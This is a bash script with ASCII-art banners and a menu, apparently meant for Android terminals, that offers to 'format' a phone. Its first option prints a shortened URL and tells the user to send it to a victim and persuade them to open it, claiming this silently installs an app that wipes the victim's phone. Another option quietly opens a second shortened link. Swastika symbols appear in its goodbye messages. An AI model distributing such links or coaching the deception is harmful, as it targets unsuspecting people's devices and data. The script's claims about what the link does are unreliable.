#!/bin/bash
echo -e "\033[1;32m====================================================="
echo -e "              InsTa : yacine__bk__46                 "
echo -e "=====================================================\033[0m"

echo "Welcome to my script! What would you like to do?"

echo -e "\033[1;32m======================================================"
echo -e "              $ Script Formate Phone $         "
echo -e  "======================================================"
echo -e ""
echo -e "\033[1;32m

                     ╔═══════════╗ 
                   ╔═╝███████████╚═╗
                  ╔╝███████████████╚╗ 
                  ║█████████████████║ 
                  ║█████████████████║ 
                  ║█████████████████║
                  ║█╔█████████████╗█║ 
                  ╚╦╝███▒▒███▒▒███╚╦╝ 
                  ╔╝██▒▒▒▒███▒▒▒▒██╚╗ 
                  ║██▒▒▒▒▒███▒▒▒▒▒██║ 
                  ║██▒▒▒▒█████▒▒▒▒██║ 
                  ╚╗███████████████╔╝
                 ╔═╬══╦╝██▒█▒██╚╦══╝.▒.. 
                 ║█║══║█████████║　...▒.  
                 ║█║══║█║██║██║█║　.▒..
                 ║█║══╚═╩══╩╦═╩═╩═╦═╩╝
                 Coded By Yacine Bk ✓✓✓✓
                    ╝█████║█║██║██
                    ██████║███████


\n"

###############################
#Complering
############################## 
#!/bin/yacinebk46

# Set the total progress bar value
total=100

# Print the progress bar
echo -ne 'Loading ....'
for i in $(seq 1 $total); do
    echo -ne '██'
    sleep 0.1
done
echo -ne '|\n'
################################
#Fonction ------->
################################
#!/bin/bash
echo -e "\e[93m            >>>>>>> Options <<<<<<<\n"
echo -e "\033[1;31m  ☞         [1]\033[1;32m Formate Phone"
echo -e "\033[1;31m  ☞         [2]\033[1;32m Chat"
echo -e "\033[1;31m  ☞         [3]\033[1;32m Save"
echo -e "\033[1;31m  ☞         [4]\033[1;32m Subscribe"
echo -e "\033[1;31m  ☞         [5]\033[1;32m Exit \n "
echo " "
echo -e "\e[93m             ✖₪ ==> Select <== ₪✖   "
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "

read choice

#case $choice in
  if [ $choice = "1" ];
then
clear
echo -e "\033[1;32m

               *🔰₱IۣۜŘΔۜۜ₮Σ$͡[❍ℱℭ]🔰*
                    ░░░░▓
                    ░░░▓▓
                    ░░█▓▓█
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░░░██▓▓██
                    ░░░░██▓▓██
                    ░░░██▓▓██
                    ░░██▓▓██
                    ░░██▓▓██
                    ░░██▓▓██
                    ░░██▓▓██
                    ░░██▓▓██
                    ░░██▓▓██
                    ░░░██▓▓███
                    ░░░░██▓▓████
                    ░░░░░██▓▓█████
                    ░░░░░░██▓▓██████
                    ░░░░░░███▓▓███████
                    ░░░░░████▓▓████████
                    ░░░░█████▓▓█████████
                    ░░░█████░░░█████●███
                    ░░████░░░░░░░███████
                    ░░███░░░░░░░░░██████
                    ░░██░░░░░░░░░░░████
                    ░░░░░░░░░░░░░░░░███
                    ░░░░░░░░░░░░░░░░
                    ♨ ❝  Yacine Bk  ❞ ♨
\n "
echo -e "\033[1;31m                 【 This Is The Tool 】\n "
echo " Copy This Link And Send To Your Victim x say anything and convaince the victim the tool , if the victim open the url the app install automaticly and the phone of the victim will formated "
echo " "
echo "                            👇👇👇👇👇👇 "
echo " "
echo -e "\033[1;31m          LinK : \033[1;32m https://tinyurl.com/uppdatesnew \n"
echo "                            👆👆👆👆👆👆  "
echo " "
echo -e "\033[1;31m iff You have a prblem returnn This Page and Click to Chat me and send a message inn My instgram "
echo " "
echo -ne "\e[92m#Tap exit : "
read returne
if [ $returne = "exit" ];
then
echo -e "\033[1;32m=================================="
echo -e "              InsTa : yacine__bk__46        "
echo -e "====================================================================="

echo "Welcome to my script! What would you like to do"

echo -e "\033[1;32m=========================================="
echo -e "              $ Script Formate Phone $      "
echo -e  "========================================================="
echo -e ""
echo -e "\033[1;32m

                     ╔═══════════╗
                   ╔═╝███████████╚═╗
                  ╔╝███████████████╚╗
                  ║█████████████████║
                  ║█████████████████║
                  ║█████████████████║
                  ║█╔█████████████╗█║
                  ╚╦╝███▒▒███▒▒███╚╦╝
                  ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                  ║██▒▒▒▒▒███▒▒▒▒▒██║
                  ║██▒▒▒▒█████▒▒▒▒██║
                  ╚╗███████████████╔╝
                 ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                 ║█║══║█████████║　...▒.
                 ║█║══║█║██║██║█║　.▒..
                 ║█║══╚═╩══╩╦═╩═╩═╦═╩╝
                 Coded By Yacine Bk ✓✓✓✓
                    ╝█████║█║██║██
                    ██████║███████
\n"

else
echo -e "\033[1;32m======================================================"
echo -e "              InsTa : yacine__bk__46        "
echo -e "======================================================"

echo "Welcome to my script! What would you like to do "

echo -e "\033[1;32m======================================================"
echo -e "              $ Script Formate Phone $      "
echo -e  "======================================================"
echo -e " "
echo -e "\033[1;32m

                     ╔═══════════╗
                   ╔═╝███████████╚═╗
                  ╔╝███████████████╚╗
                  ║█████████████████║
                  ║█████████████████║
                  ║█████████████████║
                  ║█╔█████████████╗█║
                  ╚╦╝███▒▒███▒▒███╚╦╝
                  ╔╝██▒▒▒▒███▒▒▒▒██╚╗
                  ║██▒▒▒▒▒███▒▒▒▒▒██║
                  ║██▒▒▒▒█████▒▒▒▒██║
                  ╚╗███████████████╔╝
                 ╔═╬══╦╝██▒█▒██╚╦══╝.▒..
                 ║█║══║█████████║　...▒.
                 ║█║══║█║██║██║█║　.▒..
                 ║█║══╚═╩══╩╦═╩═╩═╦═╩╝
                 Coded By Yacine Bk ✓✓✓✓
                    ╝█████║█║██║██
                    ██████║███████
\n"
fi
fi 

if [ $choice = "2" ]
then
clear
echo -e  "\033[1;32m

                  ╔════•ೋೋ•════╗ 
                    My Account
                  ╚════•ೋೋ•════╝

\n"
total=50
echo -ne ' Loading.... '
for i in $(seq 1 $total); do
echo -ne '#'
sleep 0.1
done
echo -ne '#\n'
clear 
echo " "
echo -e "\033[1;32m 
                ─────█─▄▀█──█▀▄─█──
                ────▐▌──────────▐▌──
                ────█▌▀▄──▄▄──▄▀▐█──
                ───▐██──▀▀──▀▀──██▌──
                ──▄████▄──▐▌──▄████▄─
\n"
echo -e "\e[93m    ╔════•ೋೋ•════╗"
echo -e "\033[1;31m     Instgram     "
echo -e "\e[93m    ╚════•ೋೋ•════╝ "
echo " "
echo -e "\033[1;31m ☞   \e[93m User_name : \033[1;32m yacine__bk__46 "
echo " "
echo -e "\e[93m    ╔════•ೋೋ•════╗"
echo -e "\033[1;31m     Facebook     "
echo -e "\e[93m    ╚════•ೋೋ•════╝ "
echo " "
echo -e "\033[1;31m ☞   \e[93m Lien-: \033[1;32m https://www.facebook.com/profile.php?id=100049787720079 "
echo " "
echo -ne  "\033[1;32m #Tap To Exit : "
read reeturne
if [ $reeturne = "exit" ];
then
echo -e  "\033[1;031m   Don't forget , Follow me ☬ "
else 
echo -e  "\033[1;031m   Don't forget , Follow me ☬ "
fi 
fi

if [ $choice = "3" ];
then
clear
echo -e "\033[1;031m

                ╔╗╴╴╴╔══════╗
                ║║╴╴╴║╴╔════╝
                ║╚═══╝╴╚════╗
                ╚════╗╴╔═══╗║
                ╔════╝╴║╴╴╴║║
                ╚══════╝╴╴╴╚╝
\n"
 

echo -e "\033[1;032m         [This Script Already saved in Your Phone ] "

echo -ne "\033[1;032m #Tap To Exit : "
read retuurn
if [ $retuurn = "exit" ];
then 
echo -e "\033[1;31m  Good Bye 卐卐 "
else
echo -e "\033[1;31m  Good Bye 卐卐"
fi
fi
if [ $choice = "5" ];
then
total=50
for i in $(seq 1 $total); do
echo -ne '#'
sleep 0.1
done
echo -ne '#\n'
clear
echo " "
echo -e " \033[1;031m   Thanks You For Using My script ✓✓✓ "
fi
if [ $choice = "4" ];
then 
am start -a android.intent.action.VIEW -d bit.ly/3Z1ZNii > /dev/null 2>&1
fi
#total=100



# Print the progress bar
#echo -ne Exit ....'
#for i in $(seq 1 $total); do
 #   echo -ne #'
  #  sleep 0.1
#done#echo -ne #\n'
